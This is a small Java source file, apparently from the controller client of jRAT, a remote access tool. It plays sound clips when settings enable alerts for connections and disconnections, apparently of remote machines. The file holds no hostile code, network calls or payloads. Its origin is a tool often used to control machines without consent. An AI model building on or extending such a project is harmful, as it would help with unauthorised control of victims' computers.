package pro.jrat.client;

import java.applet.Applet;
import java.applet.AudioClip;

import pro.jrat.client.settings.Settings;

public class Sound {

	private static AudioClip add;
	private static AudioClip remove;

	public static void initialize() {
		if (Settings.getGlobal().getBoolean("soundonc")) {
			add = Applet.newAudioClip(Sound.class.getResource("/files/add.wav"));
		}
		if (Settings.getGlobal().getBoolean("soundondc")) {
			remove = Applet.newAudioClip(Sound.class.getResource("/files/remove.wav"));
		}
	}

	public static void playAdd() {
		if (add != null && Settings.getGlobal().getBoolean("soundonc")) {
			add.play();
		}
	}

	public static void playRemove() {
		if (remove != null && Settings.getGlobal().getBoolean("soundondc")) {
			remove.play();
		}
	}

}
